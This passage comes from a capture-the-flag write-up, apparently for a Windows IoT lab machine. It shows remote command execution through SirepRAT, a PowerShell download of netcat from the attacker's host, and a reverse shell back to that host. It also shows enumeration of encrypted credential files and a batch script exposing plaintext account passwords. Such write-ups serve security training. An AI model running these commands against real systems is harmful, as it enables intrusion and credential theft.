</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>python</span> <span class=n>SirepRAT</span><span class=o>.</span><span class=n>py</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.204</span> <span class=n>LaunchCommandWithOutput</span> <span class=o>--</span><span class=n>return_output</span> <span class=o>--</span><span class=n>cmd</span> <span class=s2>&#34;C:\Windows\System32\hostname.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>HResultResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=n>HResult</span><span class=p>:</span> <span class=mh>0x0</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>OutputStreamResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>11</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>6</span><span class=p>,</span> <span class=n>payload</span> <span class=n>peek</span><span class=p>:</span> <span class=s1>&#39;omni&#39;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>ErrorStreamResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>12</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=n>payload</span> <span class=n>peek</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>The RCE works, we retrieved the hostname.</p><h2 id=deploying-a-reverse-shell>Deploying a reverse shell<a hidden class=anchor aria-hidden=true href=#deploying-a-reverse-shell>#</a></h2><p>We can&rsquo;t use classis LOLBAS like certutils for downloading but we can still use powershell.</p><p>We can use one of those <a href=https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell>three methods</a>:</p><ol><li>Invoke-WebRequest</li><li>System.Net.WebClient</li><li>Start-BitsTransfer</li></ol><p>So let&rsquo;s use <code>Invoke-WebRequest</code> to download a binary served by our one-line ruby HTTP server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby -run -ehttpd /usr/share/windows/windows-binaries/ -p9999
</span></span><span class=line><span class=cl>[2020-10-13 22:46:52] INFO  WEBrick 1.6.0
</span></span><span class=line><span class=cl>[2020-10-13 22:46:52] INFO  ruby 2.7.2 (2020-10-01) [x86_64-linux]
</span></span><span class=line><span class=cl>[2020-10-13 22:46:52] INFO  WEBrick::HTTPServer#start: pid=53742 port=9999
</span></span></code></pre></td></tr></table></div></div><p>PS: It&rsquo;s no use to try a meterpreter or any MSF reverse shell are they will be
a good chance that Windows Defender will block it since we&rsquo;re on Windows 10.
So let&rsquo;s use ncat instead.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>python</span> <span class=n>SirepRAT</span><span class=o>.</span><span class=n>py</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.204</span> <span class=n>LaunchCommandWithOutput</span> <span class=o>--</span><span class=n>return_output</span> <span class=o>--</span><span class=n>cmd</span> <span class=s2>&#34;C:\Windows\System32\cmd.exe&#34;</span> <span class=o>--</span><span class=n>args</span> <span class=s2>&#34; /c powershell Invoke-Webrequest -OutFile C:\Windows</span><span class=se>\t</span><span class=s2>emp</span><span class=se>\n</span><span class=s2>cat.exe -Uri http://10.10.14.173:9999/ncat.exe&#34;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>HResultResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=n>HResult</span><span class=p>:</span> <span class=mh>0x0</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Launching the ncat I had a compatibility error. Let&rsquo;s check the architecture:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>python</span> <span class=n>SirepRAT</span><span class=o>.</span><span class=n>py</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.204</span> <span class=n>LaunchCommandWithOutput</span> <span class=o>--</span><span class=n>return_output</span> <span class=o>--</span><span class=n>cmd</span> <span class=s2>&#34;C:\Windows\System32\cmd.exe&#34;</span> <span class=o>--</span><span class=n>args</span> <span class=s1>&#39; /c powershell $env:PROCESSOR_ARCHITECTURE&#39;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>HResultResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=n>HResult</span><span class=p>:</span> <span class=mh>0x0</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>OutputStreamResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>11</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>7</span><span class=p>,</span> <span class=n>payload</span> <span class=n>peek</span><span class=p>:</span> <span class=s1>&#39;AMD64&#39;</span><span class=o>&gt;</span>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>ErrorStreamResult</span> <span class=o>|</span> <span class=n>type</span><span class=p>:</span> <span class=mi>12</span><span class=p>,</span> <span class=n>payload</span> <span class=n>length</span><span class=p>:</span> <span class=mi>4</span><span class=p>,</span> <span class=n>payload</span> <span class=n>peek</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=o>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>I haven&rsquo;t found any pre-compiled version of ncat for Windows 64 bits so I
downloaded a <a href=https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip>64 bits version of netcat (nc)</a>.</p><p>So I uploaded the 64 bits version the same way and executed it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd &#34;C:\Windows\System32\cmd.exe&#34; --args &#34; /c C:\Windows\temp\nc64.exe 10.10.14.173 9999 -e powershell&#34;
</span></span></code></pre></td></tr></table></div></div><p>I was able to receive the reverse shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ pwncat -l 9999 -vv
</span></span><span class=line><span class=cl>INFO: Listening on :::9999 (family 10/IPv6, TCP)
</span></span><span class=line><span class=cl>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>INFO: Client connected from 10.10.10.204:49689 (family 2/IPv4, TCP)
</span></span><span class=line><span class=cl>Windows PowerShell
</span></span><span class=line><span class=cl>Copyright (C) Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:\windows\system32&gt;
</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation--stage-1>Privilege Escalation : stage 1<a hidden class=anchor aria-hidden=true href=#privilege-escalation--stage-1>#</a></h2><p>We are logged as omni and we can list other accounts available:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\windows\system32&gt; echo $env:UserName
</span></span><span class=line><span class=cl>omni$
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:\windows\system32&gt; ls C:\Data\Users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:\Data\Users
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>d-----         7/4/2020   9:48 PM                administrator
</span></span><span class=line><span class=cl>d-----         7/4/2020   9:53 PM                app
</span></span><span class=line><span class=cl>d-----         7/3/2020  11:22 PM                DefaultAccount
</span></span><span class=line><span class=cl>d-----         7/3/2020  11:22 PM                DevToolsUser
</span></span><span class=line><span class=cl>d-r---       10/13/2020  12:08 PM                Public
</span></span><span class=line><span class=cl>d-----         7/4/2020  10:29 PM                System
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s browse their directories:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PS C:\windows\system32&gt; gc C:\Data\Users\app\user.txt
</span></span><span class=line><span class=cl>&lt;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;Obj RefId=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;TN RefId=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
</span></span><span class=line><span class=cl>      &lt;T&gt;System.Object&lt;/T&gt;
</span></span><span class=line><span class=cl>    &lt;/TN&gt;
</span></span><span class=line><span class=cl>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
</span></span><span class=line><span class=cl>    &lt;Props&gt;
</span></span><span class=line><span class=cl>      &lt;S N=&#34;UserName&#34;&gt;flag&lt;/S&gt;
</span></span><span class=line><span class=cl>      &lt;SS N=&#34;Password&#34;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e800000000200002
</span></span><span class=line><span class=cl>0000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&lt;/SS&gt;
</span></span><span class=line><span class=cl>    &lt;/Props&gt;
</span></span><span class=line><span class=cl>  &lt;/Obj&gt;
</span></span><span class=line><span class=cl>&lt;/Objs&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:\windows\system32&gt; gc C:\Data\Users\administrator\root.txt
</span></span><span class=line><span class=cl>&lt;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;Obj RefId=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;TN RefId=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
</span></span><span class=line><span class=cl>      &lt;T&gt;System.Object&lt;/T&gt;
</span></span><span class=line><span class=cl>    &lt;/TN&gt;
</span></span><span class=line><span class=cl>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
</span></span><span class=line><span class=cl>    &lt;Props&gt;
</span></span><span class=line><span class=cl>      &lt;S N=&#34;UserName&#34;&gt;flag&lt;/S&gt;
</span></span><span class=line><span class=cl>      &lt;SS N=&#34;Password&#34;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7&lt;/SS&gt;
</span></span><span class=line><span class=cl>    &lt;/Props&gt;
</span></span><span class=line><span class=cl>  &lt;/Obj&gt;
</span></span><span class=line><span class=cl>&lt;/Objs&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PS C:\windows\system32&gt; gc C:\Data\Users\app\iot-admin.xml
</span></span><span class=line><span class=cl>gc C:\Data\Users\app\iot-admin.xml
</span></span><span class=line><span class=cl>&lt;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&gt;
</span></span><span class=line><span class=cl>  &lt;Obj RefId=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>    &lt;TN RefId=&#34;0&#34;&gt;
</span></span><span class=line><span class=cl>      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
</span></span><span class=line><span class=cl>      &lt;T&gt;System.Object&lt;/T&gt;
</span></span><span class=line><span class=cl>    &lt;/TN&gt;
</span></span><span class=line><span class=cl>    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
</span></span><span class=line><span class=cl>    &lt;Props&gt;
</span></span><span class=line><span class=cl>      &lt;S N=&#34;UserName&#34;&gt;omni\administrator&lt;/S&gt;
</span></span><span class=line><span class=cl>      &lt;SS N=&#34;Password&#34;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4b8f15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27&lt;/SS&gt;
</span></span><span class=line><span class=cl>    &lt;/Props&gt;
</span></span><span class=line><span class=cl>  &lt;/Obj&gt;
</span></span><span class=line><span class=cl>&lt;/Objs&gt;
</span></span></code></pre></td></tr></table></div></div><p>We got the flags but they are encrypted in PSCredential objects.</p><p>I seems we will be bale to decrypt them with <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7">Import-Clixml</a> to <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/import-clixml?view=powershell-7#example-2--import-a-secure-credential-object">Import a secure credential object</a>.</p><ul><li><a href=https://www.travisgan.com/2015/06/powershell-password-encryption.html>Powershell Password Encryption & Decryption</a></li><li><a href=https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx>How To Save and Read Sensitive Data with PowerShell</a></li></ul><p>But to do that we&rsquo;ll need to be logged as the target user or at least know
their credentials.</p><h2 id=system-enumeration-with-powershell>System enumeration with Powershell<a hidden class=anchor aria-hidden=true href=#system-enumeration-with-powershell>#</a></h2><p>Rather than using the long options of <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7">get-childitem</a>, I wanted to use the short aliases, so here is a command
I found on StackOverflow to list the parameter aliases:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>PS </span><span class=p>/</span><span class=n>home</span><span class=p>/</span><span class=n>cyfun</span><span class=p>&gt;</span> <span class=nb>Get-Command</span> <span class=nb>get-childitem</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>     <span class=nb>ForEach-Object</span> <span class=p>{</span><span class=nv>$_</span><span class=p>.</span><span class=py>parameters</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>         <span class=nb>ForEach-Object</span> <span class=p>{</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Values</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>             <span class=nb>Where-Object</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>                 <span class=nv>$_</span><span class=p>.</span><span class=py>Aliases</span><span class=p>.</span><span class=py>Count</span> <span class=o>-gt</span> <span class=mf>0</span> <span class=p>}</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>                 <span class=nb>Select-Object</span> <span class=n>Name</span><span class=p>,</span> <span class=n>Aliases</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>             <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&gt;&gt;</span>     <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Name</span>                <span class=n>Aliases</span>
</span></span><span class=line><span class=cl><span class=p>----</span>                <span class=p>-------</span>
</span></span><span class=line><span class=cl><span class=n>LiteralPath</span>         <span class=p>{</span><span class=n>PSPath</span><span class=p>,</span> <span class=n>LP</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Recurse</span>             <span class=p>{</span><span class=n>s</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Verbose</span>             <span class=p>{</span><span class=n>vb</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Debug</span>               <span class=p>{</span><span class=n>db</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>ErrorAction</span>         <span class=p>{</span><span class=n>ea</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>WarningAction</span>       <span class=p>{</span><span class=n>wa</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>InformationAction</span>   <span class=p>{</span><span class=n>infa</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>ErrorVariable</span>       <span class=p>{</span><span class=n>ev</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>WarningVariable</span>     <span class=p>{</span><span class=n>wv</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>InformationVariable</span> <span class=p>{</span><span class=n>iv</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>OutVariable</span>         <span class=p>{</span><span class=n>ov</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>OutBuffer</span>           <span class=p>{</span><span class=n>ob</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>PipelineVariable</span>    <span class=p>{</span><span class=n>pv</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Directory</span>           <span class=p>{</span><span class=n>ad</span><span class=p>,</span> <span class=n>d</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>File</span>                <span class=p>{</span><span class=n>af</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Hidden</span>              <span class=p>{</span><span class=n>ah</span><span class=p>,</span> <span class=n>h</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>ReadOnly</span>            <span class=p>{</span><span class=n>ar</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>System</span>              <span class=p>{</span><span class=n>as</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Here is the long and the short way to write a recursive find equivalent for
Windows in Powershell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>$</span> <span class=nb>Get-ChildItem</span> <span class=n>-Path</span> <span class=n>c:</span><span class=p>\</span> <span class=n>-Recurse</span> <span class=n>-ErrorAction</span> <span class=n>SilentlyContinue</span> <span class=n>-Force</span> <span class=n>-Filter</span> <span class=p>*.</span><span class=n>vbs</span>
</span></span><span class=line><span class=cl><span class=p>$</span> <span class=nb>gci </span><span class=n>-Path</span> <span class=n>c:</span><span class=p>\</span> <span class=n>-s</span> <span class=n>-ea</span> <span class=n>SilentlyContinue</span> <span class=n>-Force</span> <span class=n>-Filter</span> <span class=p>*.</span><span class=n>vbs</span>
</span></span></code></pre></td></tr></table></div></div><p>Found no interesting VBS scripts, so let&rsquo;s find bat scripts instead.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=p>$</span> <span class=nb>gci </span><span class=n>-Path</span> <span class=n>c:</span><span class=p>\</span> <span class=n>-s</span> <span class=n>-ea</span> <span class=n>SilentlyContinue</span> <span class=n>-Force</span> <span class=n>-Filter</span> <span class=p>*.</span><span class=n>bat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Program</span> <span class=n>Files</span><span class=p>\</span><span class=n>WindowsPowerShell</span><span class=p>\</span><span class=n>Modules</span><span class=p>\</span><span class=n>PackageManagement</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Mode</span>                <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
</span></span><span class=line><span class=cl><span class=p>----</span>                <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
</span></span><span class=line><span class=cl><span class=n>-a-h</span><span class=p>--</span>        <span class=mf>8</span><span class=p>/</span><span class=mf>21</span><span class=p>/</span><span class=mf>2020</span>  <span class=mf>12</span><span class=err>:</span><span class=mf>56</span> <span class=n>PM</span>            <span class=mf>247</span> <span class=n>r</span><span class=p>.</span><span class=n>bat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Program</span> <span class=n>Files</span><span class=p>\</span><span class=n>WindowsPowerShell</span><span class=p>\</span><span class=n>Modules</span><span class=p>\</span><span class=n>Pester</span><span class=p>\</span><span class=mf>3.4</span><span class=p>.</span><span class=py>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Mode</span>                <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
</span></span><span class=line><span class=cl><span class=p>----</span>                <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
</span></span><span class=line><span class=cl><span class=n>-a</span><span class=p>----</span>       <span class=mf>10</span><span class=p>/</span><span class=mf>26</span><span class=p>/</span><span class=mf>2018</span>  <span class=mf>11</span><span class=err>:</span><span class=mf>36</span> <span class=n>PM</span>            <span class=mf>744</span> <span class=n>Build</span><span class=p>.</span><span class=py>bat</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Directory</span><span class=err>:</span> <span class=n>C:</span><span class=p>\</span><span class=n>Program</span> <span class=n>Files</span><span class=p>\</span><span class=n>WindowsPowerShell</span><span class=p>\</span><span class=n>Modules</span><span class=p>\</span><span class=n>Pester</span><span class=p>\</span><span class=mf>3.4</span><span class=p>.</span><span class=mf>0</span><span class=p>\</span><span class=n>bin</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Mode</span>                <span class=n>LastWriteTime</span>         <span class=n>Length</span> <span class=n>Name</span>
</span></span><span class=line><span class=cl><span class=p>----</span>                <span class=p>-------------</span>         <span class=p>------</span> <span class=p>----</span>
</span></span><span class=line><span class=cl><span class=n>-a</span><span class=p>----</span>       <span class=mf>10</span><span class=p>/</span><span class=mf>26</span><span class=p>/</span><span class=mf>2018</span>  <span class=mf>11</span><span class=err>:</span><span class=mf>36</span> <span class=n>PM</span>            <span class=mf>925</span> <span class=n>Pester</span><span class=p>.</span><span class=py>bat</span>
</span></span></code></pre></td></tr></table></div></div><p>There are some promising scripts.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-batch data-lang=batch><span class=line><span class=cl>PS C:\windows\system32<span class=p>&gt;</span> gc &#39;C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat&#39;
</span></span><span class=line><span class=cl><span class=p>@</span><span class=k>echo</span> off
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>:</span><span class=nl>LOOP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=k>/F</span> <span class=s2>&#34;skip=6&#34;</span> <span class=se>%%</span>i <span class=k>in</span> <span class=p>(</span><span class=s1>&#39;net localgroup &#34;administrators&#34;&#39;</span><span class=p>)</span> <span class=k>do</span> net localgroup <span class=s2>&#34;administrators&#34;</span> <span class=se>%%</span>i /delete
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>net user app mesh5143
</span></span><span class=line><span class=cl>net user administrator _1nt3rn37ofTh1nGz
